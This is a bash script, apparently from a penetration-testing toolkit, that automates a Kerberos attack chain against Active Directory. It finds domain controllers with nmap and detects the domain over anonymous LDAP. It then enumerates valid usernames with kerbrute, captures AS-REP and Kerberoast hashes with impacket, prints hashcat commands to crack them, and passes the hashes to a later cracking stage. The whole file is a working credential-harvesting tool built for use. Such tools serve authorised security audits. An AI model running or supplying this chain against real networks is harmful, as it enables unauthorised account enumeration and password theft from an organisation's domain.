#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"
set -uo pipefail

banner "KERBEROS" "Kerbrute userenum → ASREPRoast → Kerberoast"

# ── Tool checks ────────────────────────────────────────────────────────────────
section "TOOLS"

KERBRUTE=""
_bundled="$(dirname "$0")/../kerbrute"
for _k in "$_bundled" kerbrute /usr/local/bin/kerbrute /root/go/bin/kerbrute \
           /usr/bin/kerbrute /opt/kerbrute/kerbrute /root/kerbrute; do
  if [[ -x "$_k" ]]; then
    KERBRUTE="$_k"
    break
  elif command -v "$_k" &>/dev/null 2>&1; then
    KERBRUTE="$(command -v "$_k")"
    break
  fi
done

if [[ -z "$KERBRUTE" ]]; then
  printf '  %s[!]%s kerbrute not found.%s\n\n' "${RED}" "${RESET}" "${RESET}"
  printf '  The bundled ARM64 binary should be at:\n'
  printf '    %s\n\n' "$_bundled"
  printf '  Try redeploying scripts from the app Settings screen.\n\n'
  exit 1
fi
printf '  %s[✓]%s kerbrute     : %s%s%s\n' "${GREEN}" "${RESET}" "${DIM}" "$KERBRUTE" "${RESET}"

GETNPUSERS=""
for _t in impacket-GetNPUsers GetNPUsers.py; do
  command -v "$_t" &>/dev/null 2>&1 && { GETNPUSERS="$_t"; break; }
done
if [[ -z "$GETNPUSERS" ]]; then
  printf '  %s[!]%s impacket-GetNPUsers not found.%s\n' "${RED}" "${RESET}" "${RESET}"
  printf '      pip3 install impacket   OR   apt install python3-impacket\n\n'
  exit 1
fi
printf '  %s[✓]%s GetNPUsers   : %s%s%s\n' "${GREEN}" "${RESET}" "${DIM}" "$GETNPUSERS" "${RESET}"

GETUSERSPNS=""
for _t in impacket-GetUserSPNs GetUserSPNs.py; do
  command -v "$_t" &>/dev/null 2>&1 && { GETUSERSPNS="$_t"; break; }
done
if [[ -n "$GETUSERSPNS" ]]; then
  printf '  %s[✓]%s GetUserSPNs : %s%s%s\n' "${GREEN}" "${RESET}" "${DIM}" "$GETUSERSPNS" "${RESET}"
else
  printf '  %s[~]%s GetUserSPNs : not found — Kerberoast phase will be skipped\n' "${YELLOW}" "${RESET}"
fi

# ── Target ─────────────────────────────────────────────────────────────────────
target="$(prompt_target)"

# ── Existing nmap.txt? ─────────────────────────────────────────────────────────
_nmap_load="$(pick_nmap_file)"

declare -a DC_HOSTS=()

if [[ -n "$_nmap_load" ]]; then
  outdir="${_nmap_load%%|*}"
  _nmap_txt="${_nmap_load##*|}"
  outfile="$outdir/kerberos.txt"
  : > "$outfile"

  section "DC DISCOVERY  (from nmap.txt — port 88)"
  _cur=""
  while IFS= read -r _line; do
    if [[ "$_line" =~ scan\ report\ for\ ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+) ]]; then
      _cur="${BASH_REMATCH[1]}"
    elif [[ -n "$_cur" && "$_line" =~ ^88/tcp.*open ]]; then
      DC_HOSTS+=("$_cur")
      printf '  %s[+]%s DC candidate : %s\n' "${GREEN}" "${RESET}" "$_cur"
    fi
  done < "$_nmap_txt"

  [[ ${#DC_HOSTS[@]} -eq 0 ]] && \
    printf '  %s[~]%s No port 88 hosts in nmap.txt — will scan fresh.\n' "${YELLOW}" "${RESET}"
else
  outdir="$(make_outdir)"
  outfile="$outdir/kerberos.txt"
  : > "$outfile"
fi

# ── Fresh DC discovery if needed ───────────────────────────────────────────────
if [[ ${#DC_HOSTS[@]} -eq 0 ]]; then
  section "DC DISCOVERY  (nmap — ports 88, 389, 464)"
  printf '  %s[*]%s Scanning %s for Kerberos services...%s\n' \
    "${CYAN}" "${RESET}" "$target" "${RESET}"

  start_spin "nmap running"
  mapfile -t _nmap_out < <(
    nmap -sS -Pn -n -T4 --max-retries 2 --max-scan-delay 10ms --min-rate 300 \
         -p 88,389,464 --open "$target" 2>/dev/null
  )
  stop_spin

  _cur=""
  declare -a _cur_ports=()
  for _line in "${_nmap_out[@]}"; do
    if [[ "$_line" =~ scan\ report\ for\ ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+) ]]; then
      # Commit previous host if port 88 was open
      if [[ -n "$_cur" && "${#_cur_ports[@]}" -gt 0 ]]; then
        for _p in "${_cur_ports[@]}"; do
          if [[ "$_p" == "88" ]]; then
            DC_HOSTS+=("$_cur")
            printf '  %s[+]%s DC candidate : %s  %s(ports: %s)%s\n' \
              "${GREEN}" "${RESET}" "$_cur" "${DIM}" "${_cur_ports[*]}" "${RESET}"
            break
          fi
        done
      fi
      _cur="${BASH_REMATCH[1]}"
      _cur_ports=()
    elif [[ -n "$_cur" && "$_line" =~ ^([0-9]+)/tcp.*open ]]; then
      _cur_ports+=("${BASH_REMATCH[1]}")
    fi
  done
  # Commit the last host
  if [[ -n "$_cur" && "${#_cur_ports[@]}" -gt 0 ]]; then
    for _p in "${_cur_ports[@]}"; do
      if [[ "$_p" == "88" ]]; then
        DC_HOSTS+=("$_cur")
        printf '  %s[+]%s DC candidate : %s  %s(ports: %s)%s\n' \
          "${GREEN}" "${RESET}" "$_cur" "${DIM}" "${_cur_ports[*]}" "${RESET}"
        break
      fi
    done
  fi
fi

# ── Manual DC fallback ─────────────────────────────────────────────────────────
if [[ ${#DC_HOSTS[@]} -eq 0 ]]; then
  # Single-host target may be the DC itself — verify
  if [[ ! "$target" =~ /[0-9]+$ ]]; then
    printf '\n  %s[~]%s No port 88 open on %s. Is it the DC? Testing directly...\n' \
      "${YELLOW}" "${RESET}" "$target"
    if nmap -sS -Pn -n -T4 -p 88 --open "$target" 2>/dev/null | grep -q "^88/tcp.*open"; then
      DC_HOSTS+=("$target")
      printf '  %s[+]%s DC confirmed : %s\n' "${GREEN}" "${RESET}" "$target"
    fi
  fi
  if [[ ${#DC_HOSTS[@]} -eq 0 ]]; then
    printf '\n  %s[!]%s No DC found (port 88 not open on %s)\n' \
      "${YELLOW}" "${RESET}" "$target"
    if [[ -n "${SESSION_DIR:-}" ]]; then
      printf '  %s[CHAIN]%s No DC discovered — exiting pipeline step%s\n' "${CYAN}" "${RESET}" "${RESET}"
      mark_done "$outfile"; exit 0
    fi
    printf '  %s>>%s Enter DC IP manually (or Enter to exit): ' "${CYAN}" "${RESET}"
    IFS= read -r _manual_dc
    [[ -z "$_manual_dc" ]] && { mark_done "$outfile"; exit 0; }
    DC_HOSTS+=("$_manual_dc")
  fi
fi

# Pipeline chain: try chain_dc.txt if DC still not found
if [[ ${#DC_HOSTS[@]} -eq 0 ]] && [[ -n "${SESSION_DIR:-}" ]] && [[ -s "${SESSION_DIR}/chain_dc.txt" ]]; then
  while IFS= read -r _dc_ip; do
    DC_HOSTS+=("$_dc_ip")
  done < "${SESSION_DIR}/chain_dc.txt"
  printf '  %s[CHAIN]%s Loaded %d DC(s) from chain_dc.txt%s\n' \
    "${CYAN}" "${RESET}" "${#DC_HOSTS[@]}" "${RESET}"
fi

# ── DC selection ───────────────────────────────────────────────────────────────
DC_IP=""
if [[ ${#DC_HOSTS[@]} -eq 1 ]]; then
  DC_IP="${DC_HOSTS[0]}"
  printf '\n  %s[*]%s DC selected : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$DC_IP" "${RESET}"
elif [[ ${#DC_HOSTS[@]} -gt 1 ]] && [[ -n "${SESSION_DIR:-}" ]]; then
  DC_IP="${DC_HOSTS[0]}"
  printf '\n  %s[CHAIN]%s DC auto-selected: %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$DC_IP" "${RESET}"
elif [[ ${#DC_HOSTS[@]} -gt 1 ]]; then
  printf '\n  %s[*]%s Multiple DC candidates:\n\n' "${CYAN}" "${RESET}"
  for _i in "${!DC_HOSTS[@]}"; do
    printf '  %s[%02d]%s  %s\n' "${CYAN}" "$(( _i + 1 ))" "${RESET}" "${DC_HOSTS[$_i]}"
  done
  printf '\n  %s>>%s Select DC [1]: ' "${CYAN}" "${RESET}"
  read -r _pick; _pick="${_pick:-1}"
  if ! [[ "$_pick" =~ ^[0-9]+$ ]] || (( _pick < 1 || _pick > ${#DC_HOSTS[@]} )); then
    printf '  %s[!]%s Invalid selection.\n' "${RED}" "${RESET}"; exit 1
  fi
  DC_IP="${DC_HOSTS[$(( _pick - 1 ))]}"
fi

# ── Domain detection ───────────────────────────────────────────────────────────
section "DOMAIN DETECTION"

DOMAIN=""

# Try LDAP anonymous bind
if command -v ldapsearch &>/dev/null 2>&1; then
  printf '  %s[*]%s LDAP anonymous query on %s ...\n' "${CYAN}" "${RESET}" "$DC_IP"
  _dn="$(ldapsearch -x -H "ldap://$DC_IP" -s base \
    '(objectClass=*)' defaultNamingContext 2>/dev/null \
    | grep -i '^defaultNamingContext:' | head -1 \
    | sed 's/.*: //')" || true

  if [[ -n "$_dn" ]]; then
    # Convert "DC=corp,DC=example,DC=com" → "corp.example.com"
    DOMAIN="$(printf '%s' "$_dn" \
      | grep -oiE 'DC=[^,]+' \
      | sed 's/DC=//Ig' \
      | paste -sd '.' - \
      | tr '[:upper:]' '[:lower:]')"
    [[ -n "$DOMAIN" ]] && \
      printf '  %s[+]%s Domain detected : %s%s%s\n' "${GREEN}" "${RESET}" "${BOLD}" "$DOMAIN" "${RESET}"
  else
    printf '  %s[~]%s LDAP returned no domain info (anonymous bind may be blocked)\n' "${YELLOW}" "${RESET}"
  fi
else
  printf '  %s[~]%s ldapsearch not available — skipping auto-detect\n' "${YELLOW}" "${RESET}"
fi

# Manual entry if detection failed — check chain_domain.txt first in pipeline mode
if [[ -z "$DOMAIN" ]]; then
  if [[ -n "${SESSION_DIR:-}" ]] && [[ -s "${SESSION_DIR}/chain_domain.txt" ]]; then
    DOMAIN=$(head -1 "${SESSION_DIR}/chain_domain.txt")
    printf '  %s[CHAIN]%s Domain loaded from chain_domain.txt: %s%s\n' "${CYAN}" "${RESET}" "$DOMAIN" "${RESET}"
  elif [[ -n "${SESSION_DIR:-}" ]]; then
    printf '  %s[CHAIN]%s No domain available — skipping kerberos pipeline step%s\n' "${CYAN}" "${RESET}" "${RESET}"
    mark_done "$outfile"; exit 0
  else
    printf '  %s>>%s Enter domain name (e.g. corp.example.com): ' "${CYAN}" "${RESET}"
    IFS= read -r DOMAIN
    if [[ -z "$DOMAIN" ]]; then
      printf '  %s[!]%s Domain name is required.\n' "${RED}" "${RESET}"; exit 1
    fi
  fi
fi

printf '\n  %s[SYS]%s DC     : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$DC_IP"  "${RESET}"
printf '  %s[SYS]%s Domain : %s%s%s\n\n' "${CYAN}" "${RESET}" "${GREEN}" "$DOMAIN" "${RESET}"

# ── Wordlist selection ─────────────────────────────────────────────────────────
section "WORDLIST"

_XATO="/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
_SHORT="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"

printf '  %s[01]%s ▶  xato 10M     %s(~10M usernames — thorough)%s\n' \
  "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
printf '  %s[02]%s ▶  shortlist    %s(top-usernames-shortlist.txt — fast recon)%s\n' \
  "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
printf '  %s[03]%s ▶  custom path\n\n' "${CYAN}" "${RESET}"
if [[ -n "${SESSION_DIR:-}" ]]; then
  # Pipeline: prefer chain_users.txt (real AD users from enum4linux/ldap_dump) → faster + more accurate
  if [[ -s "${SESSION_DIR}/chain_users.txt" ]]; then
    WORDLIST="${SESSION_DIR}/chain_users.txt"
    _uc=$(wc -l < "$WORDLIST" || echo 0)
    printf '  %s[CHAIN]%s Wordlist: chain_users.txt (%s real AD users — targeted)%s\n' \
      "${CYAN}" "${RESET}" "$_uc" "${RESET}"
  else
    _wl_sel=2; WORDLIST="$_SHORT"
    printf '  %s[CHAIN]%s Wordlist: shortlist (no chain_users.txt yet)%s\n' "${CYAN}" "${RESET}" "${RESET}"
  fi
else
  printf '  %s>>%s Wordlist [1]: ' "${CYAN}" "${RESET}"
  read -r _wl_sel; _wl_sel="${_wl_sel:-1}"
  WORDLIST=""
  case "$_wl_sel" in
    2)  WORDLIST="$_SHORT" ;;
    3)  printf '  %s>>%s Wordlist path: ' "${CYAN}" "${RESET}"
        IFS= read -r WORDLIST ;;
    *)  WORDLIST="$_XATO" ;;
  esac
fi

if [[ ! -f "$WORDLIST" ]]; then
  printf '  %s[!]%s Wordlist not found: %s\n' "${RED}" "${RESET}" "$WORDLIST"
  printf '      apt install seclists\n\n'
  exit 1
fi

_wl_lines="$(wc -l < "$WORDLIST" 2>/dev/null | tr -d '[:space:]')"
printf '  %s[✓]%s %s  %s(%s lines)%s\n' \
  "${GREEN}" "${RESET}" "$WORDLIST" "${DIM}" "${_wl_lines:-?}" "${RESET}"

if [[ -n "${SESSION_DIR:-}" ]]; then
  THREADS=20
  printf '  %s[CHAIN]%s Threads: 20  (pipeline auto-select)%s\n\n' "${CYAN}" "${RESET}" "${RESET}"
else
  printf '\n  %s>>%s Threads [20]: ' "${CYAN}" "${RESET}"
  read -r THREADS; THREADS="${THREADS:-20}"
fi

# ── Output structure ───────────────────────────────────────────────────────────
mkdir -p "$outdir/hashes"

_kerbrute_raw="$outdir/kerbrute_raw.txt"
_users_plain="$outdir/valid_users.txt"
_users_upn="$outdir/valid_users_upn.txt"
_asrep_out="$outdir/hashes/asrep_hashes.txt"
_kerberoast_out="$outdir/hashes/kerberoast_hashes.txt"

# Initialise output files
: > "$_kerbrute_raw"
: > "$_users_plain"
: > "$_users_upn"
: > "$_asrep_out"

# Session header in main report
{
  printf '=== KERBEROS SESSION ===\n'
  printf 'Date   : %s\n' "$(date -Iseconds)"
  printf 'DC     : %s\n' "$DC_IP"
  printf 'Domain : %s\n' "$DOMAIN"
  printf 'WL     : %s\n\n' "$WORDLIST"
} >> "$outfile"

printf '\n  %s[SYS]%s Output dir : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outdir" "${RESET}"

# ── Phase 1: Kerbrute userenum ─────────────────────────────────────────────────
section "PHASE 1 — KERBRUTE USER ENUMERATION"
printf '  %s[*]%s Domain  : %s%s%s\n' "${CYAN}" "${RESET}" "${BOLD}" "$DOMAIN"  "${RESET}"
printf '  %s[*]%s DC      : %s\n'     "${CYAN}" "${RESET}"              "$DC_IP"
printf '  %s[*]%s Threads : %s\n'     "${CYAN}" "${RESET}"              "$THREADS"
printf '  %s[*]%s WL      : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}"  "$WORDLIST" "${RESET}"

run_fg "$KERBRUTE" userenum \
  --dc      "$DC_IP"   \
  -d        "$DOMAIN"  \
  --threads "$THREADS" \
  -o        "$_kerbrute_raw" \
  "$WORDLIST"

# Extract valid usernames from kerbrute output file.
# kerbrute -o writes lines like:
#   "2024/01/01 12:00:00 >  [+] VALID USERNAME:   user@domain.com"  (verbose format)
#   "user@domain.com"                                                 (plain format)
# Handle both defensively.
if [[ -s "$_kerbrute_raw" ]]; then
  # Try verbose format first
  _extracted="$(grep -i 'VALID USERNAME' "$_kerbrute_raw" \
    | grep -oiE '[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}' 2>/dev/null \
    | sort -u)" || true

  # Fallback: plain UPN per line (kerbrute v1.0+ -o format)
  if [[ -z "$_extracted" ]]; then
    _extracted="$(grep -iE '^[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$' \
      "$_kerbrute_raw" 2>/dev/null | sort -u)" || true
  fi

  if [[ -n "$_extracted" ]]; then
    printf '%s\n' "$_extracted" > "$_users_upn"
    cut -d@ -f1 "$_users_upn" | sort -u > "$_users_plain"
  fi
fi

_valid_count="$(wc -l < "$_users_plain" 2>/dev/null | tr -d '[:space:]')"
_valid_count="${_valid_count:-0}"
# Ensure it's a number
[[ "$_valid_count" =~ ^[0-9]+$ ]] || _valid_count=0

# Append to main report
{
  printf '=== VALID USERS (%s) ===\n' "$_valid_count"
  [[ -s "$_users_plain" ]] && cat "$_users_plain" || printf '(none)\n'
  printf '\n'
} >> "$outfile"

if [[ "$_valid_count" -eq 0 ]]; then
  printf '\n  %s[~]%s No valid users found.\n' "${YELLOW}" "${RESET}"
  printf '       Possible causes: DC/domain mismatch · lockout policy · users not in wordlist\n\n'
  printf '  %s[SYS]%s Kerbrute output : %s%s%s\n'   "${CYAN}" "${RESET}" "${DIM}" "$_kerbrute_raw" "${RESET}"
  printf '  %s[SYS]%s Valid users file: %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$_users_plain"  "${RESET}"
  mark_done "$outfile"
  exit 0
fi

printf '\n  %s[+]%s %s%d valid user(s)%s found:\n\n' \
  "${GREEN}" "${RESET}" "${BOLD}" "$_valid_count" "${RESET}"
while IFS= read -r _u; do
  printf '  %s  ●%s  %s\n' "${GREEN}" "${RESET}" "$_u"
done < "$_users_plain"
printf '\n'
printf '  %s[SYS]%s Users (plain)  : %s%s%s\n' "${CYAN}" "${RESET}" "${DIM}" "$_users_plain" "${RESET}"
printf '  %s[SYS]%s Users (UPN)    : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$_users_upn" "${RESET}"

# ── Phase 2: ASREPRoasting ─────────────────────────────────────────────────────
section "PHASE 2 — ASREPRoasting  (no credentials required)"
printf '  %s[*]%s Querying %d user(s) — checking for pre-auth disabled...%s\n\n' \
  "${CYAN}" "${RESET}" "$_valid_count" "${RESET}"

run_fg "$GETNPUSERS" \
  "$DOMAIN/"       \
  -no-pass         \
  -request         \
  -usersfile  "$_users_plain" \
  -dc-ip      "$DC_IP"        \
  -format     hashcat         \
  -outputfile "$_asrep_out"

_asrep_count=0
if [[ -s "$_asrep_out" ]]; then
  _asrep_count="$(grep -c '^\$krb5asrep' "$_asrep_out" 2>/dev/null || echo 0)"
  _asrep_count="${_asrep_count:-0}"
  [[ "$_asrep_count" =~ ^[0-9]+$ ]] || _asrep_count=0
fi

{
  printf '=== ASREP HASHES (%s) ===\n' "$_asrep_count"
  [[ -s "$_asrep_out" ]] && cat "$_asrep_out" || printf '(none)\n'
  printf '\n'
} >> "$outfile"

printf '\n'
if [[ "$_asrep_count" -gt 0 ]]; then
  printf '  %s[+]%s %s%d ASREP hash(es)%s captured!\n' \
    "${GREEN}" "${RESET}" "${BOLD}" "$_asrep_count" "${RESET}"
  printf '  %s[*]%s Crack: hashcat -m 18200 %s%s%s /usr/share/wordlists/rockyou.txt\n' \
    "${CYAN}" "${RESET}" "${DIM}" "$_asrep_out" "${RESET}"
  printf '  %s[SYS]%s Hashes : %s%s%s\n\n' \
    "${CYAN}" "${RESET}" "${DIM}" "$_asrep_out" "${RESET}"
else
  printf '  %s[~]%s No ASREP-roastable accounts — all users require pre-auth\n\n' \
    "${YELLOW}" "${RESET}"
fi

# ── Phase 3: Kerberoasting ─────────────────────────────────────────────────────
_krb_count=0

if [[ -n "$GETUSERSPNS" ]]; then
  section "PHASE 3 — KERBEROASTING  (requires valid credentials)"
  if [[ -n "${SESSION_DIR:-}" ]]; then
    # Pipeline: auto-attempt Kerberoast with chain_creds.txt if available
    if [[ -s "${SESSION_DIR}/chain_creds.txt" ]]; then
      _cline=$(grep -m1 'login:.*password:' "${SESSION_DIR}/chain_creds.txt" 2>/dev/null || true)
      if [[ -n "$_cline" ]]; then
        KERBUSER=$(echo "$_cline" | grep -oP 'login:\s*\K\S+' || true)
        KERBPASS=$(echo "$_cline" | grep -oP 'password:\s*\K\S+' || true)
        _do_kerb="y"
        printf '  %s[CHAIN]%s Kerberoasting with chain_creds.txt credentials%s\n\n' \
          "${CYAN}" "${RESET}" "${RESET}"
      else
        _do_kerb="n"
        printf '  %s[CHAIN]%s No valid creds in chain_creds.txt — skipping Kerberoast%s\n\n' \
          "${DIM}" "${RESET}" "${RESET}"
      fi
    else
      _do_kerb="n"
      printf '  %s[CHAIN]%s No chain_creds.txt — skipping Kerberoast%s\n\n' \
        "${DIM}" "${RESET}" "${RESET}"
    fi
  else
    printf '  %s>>%s Do you have valid AD credentials? [y/N]: ' "${CYAN}" "${RESET}"
    read -r _do_kerb; _do_kerb="${_do_kerb:-n}"
  fi

  if [[ "${_do_kerb,,}" == "y" ]]; then
    printf '\n  %s>>%s Username (DOMAIN\\user or user@domain or plain): ' "${CYAN}" "${RESET}"
    IFS= read -r KERBUSER
    printf '  %s>>%s Password: ' "${CYAN}" "${RESET}"
    set +H
    IFS= read -rs KERBPASS
    set -H 2>/dev/null || true
    printf '\n'

    if [[ -z "$KERBUSER" || -z "$KERBPASS" ]]; then
      printf '  %s[!]%s Username and password are required — skipping Kerberoast.\n\n' \
        "${RED}" "${RESET}"
    else
      printf '  %s[*]%s Requesting TGS tickets for service accounts...\n\n' "${CYAN}" "${RESET}"
      printf '  %s[~]%s Note: passwords containing ":" may cause parsing issues (impacket limitation)\n\n' \
        "${DIM}" "${RESET}"

      : > "$_kerberoast_out"

      run_fg "$GETUSERSPNS" \
        "$DOMAIN/$KERBUSER:$KERBPASS" \
        -dc-ip      "$DC_IP"          \
        -request                      \
        -format     hashcat           \
        -outputfile "$_kerberoast_out"

      if [[ -s "$_kerberoast_out" ]]; then
        _krb_count="$(grep -c '^\$krb5tgs' "$_kerberoast_out" 2>/dev/null || echo 0)"
        _krb_count="${_krb_count:-0}"
        [[ "$_krb_count" =~ ^[0-9]+$ ]] || _krb_count=0
      fi

      {
        printf '=== KERBEROAST HASHES (%s) ===\n' "$_krb_count"
        [[ -s "$_kerberoast_out" ]] && cat "$_kerberoast_out" || printf '(none)\n'
        printf '\n'
      } >> "$outfile"

      printf '\n'
      if [[ "$_krb_count" -gt 0 ]]; then
        printf '  %s[+]%s %s%d TGS hash(es)%s captured!\n' \
          "${GREEN}" "${RESET}" "${BOLD}" "$_krb_count" "${RESET}"
        printf '  %s[*]%s Crack: hashcat -m 13100 %s%s%s /usr/share/wordlists/rockyou.txt\n' \
          "${CYAN}" "${RESET}" "${DIM}" "$_kerberoast_out" "${RESET}"
        printf '  %s[SYS]%s Hashes : %s%s%s\n\n' \
          "${CYAN}" "${RESET}" "${DIM}" "$_kerberoast_out" "${RESET}"
      else
        printf '  %s[~]%s No Kerberoastable service accounts found.\n\n' "${YELLOW}" "${RESET}"
      fi
    fi
  else
    printf '  %s[~]%s Kerberoast skipped.\n\n' "${DIM}" "${RESET}"
  fi
else
  section "PHASE 3 — KERBEROASTING"
  printf '  %s[~]%s Skipped — impacket-GetUserSPNs not installed.\n' "${YELLOW}" "${RESET}"
  printf '      pip3 install impacket   OR   apt install python3-impacket\n\n'
fi

# ── Summary ────────────────────────────────────────────────────────────────────
printf '  %s┌──────────────────────────────────────────────────┐%s\n' "${CYAN}" "${RESET}"
printf '  %s│  KERBEROS AUDIT COMPLETE                        │%s\n' "${CYAN}${BOLD}" "${RESET}"
printf '  %s└──────────────────────────────────────────────────┘%s\n\n' "${CYAN}" "${RESET}"

printf '  %s[SYS]%s DC            : %s\n'     "${CYAN}" "${RESET}" "$DC_IP"
printf '  %s[SYS]%s Domain        : %s\n'     "${CYAN}" "${RESET}" "$DOMAIN"
printf '  %s[SYS]%s Valid users   : %s%d%s → %s\n' \
  "${CYAN}" "${RESET}" "${BOLD}" "$_valid_count" "${RESET}" "$_users_plain"
printf '  %s[SYS]%s ASREP hashes  : %d → %s\n' "${CYAN}" "${RESET}" "$_asrep_count" "$_asrep_out"
if [[ "$_krb_count" -gt 0 ]]; then
  printf '  %s[SYS]%s Kerb. hashes  : %d → %s\n' "${CYAN}" "${RESET}" "$_krb_count" "$_kerberoast_out"
fi
printf '  %s[SYS]%s Report dir    : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outdir" "${RESET}"

# ── Pipeline chain: publish Kerberos hashes ───────────────────────────────────
if [[ -n "${SESSION_DIR:-}" ]]; then
  _published=0
  [[ -s "$_asrep_out" ]] && { cat "$_asrep_out" >> "${SESSION_DIR}/chain_hashes.txt" 2>/dev/null; _published=1; }
  [[ -s "$_kerberoast_out" ]] && { cat "$_kerberoast_out" >> "${SESSION_DIR}/chain_hashes.txt" 2>/dev/null; _published=1; }
  if (( _published )); then
    sort -u "${SESSION_DIR}/chain_hashes.txt" -o "${SESSION_DIR}/chain_hashes.txt" 2>/dev/null || true
    printf '  %s[CHAIN]%s chain_hashes.txt: Kerberos hashes published for hashcrack%s\n\n' \
      "${CYAN}" "${RESET}" "${RESET}"
  fi
fi

mark_done "$outfile"
